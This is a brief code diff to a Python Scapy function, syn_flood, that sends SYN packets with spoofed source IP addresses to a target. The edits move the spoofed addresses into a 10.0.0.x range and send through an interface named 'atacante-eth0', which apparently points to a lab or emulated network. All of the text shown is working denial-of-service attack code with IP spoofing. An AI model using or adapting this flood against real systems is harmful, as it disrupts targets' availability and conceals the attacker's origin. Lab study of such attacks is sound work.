@@ -25,7 +25,7 @@ def syn_flood(target_ip, target_port=80, num_packets=100, interval=0.01):
     for i in range(num_packets):
         # Crear paquete SYN con IP origen aleatoria (IP spoofing)
         ip = IP(
-            src=f"192.168.{i % 256}.{(i // 256) % 256}",  # IP aleatoria
+            src=f"10.0.0.{(i % 250) + 4}",  # IP aleatoria
             dst=target_ip
         )
         
@@ -38,7 +38,7 @@ def syn_flood(target_ip, target_port=80, num_packets=100, interval=0.01):
         packet = ip / tcp
         
         # Enviar paquete (verbose=0 para no mostrar cada paquete)
-        send(packet, verbose=0)
+        send(packet, iface="atacante-eth0" ,verbose=0)
         
         if (i + 1) % 10 == 0:
             print(f"[+] Enviados {i + 1}/{num_packets} paquetes")
